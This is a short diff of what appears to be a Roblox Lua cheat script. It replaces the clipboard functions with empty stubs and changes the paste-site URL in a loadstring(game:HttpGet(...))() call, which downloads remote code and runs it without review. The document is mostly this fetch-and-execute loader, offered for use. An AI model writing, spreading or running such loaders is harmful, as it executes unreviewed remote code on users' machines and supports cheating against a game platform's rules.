@@ -3,4 +3,4 @@ task.spawn(function() while task.wait() do pcall(function() for _,v in ipairs(ge
 setclipboard = function() end
 toclipboard = function() end
 
-loadstring(game:HttpGet("https://cdn.sourceb.in/bins/zUZPPUzTZs/0"))()
+loadstring(game:HttpGet("https://pastefy.app/5Qc62vs8/raw"))()
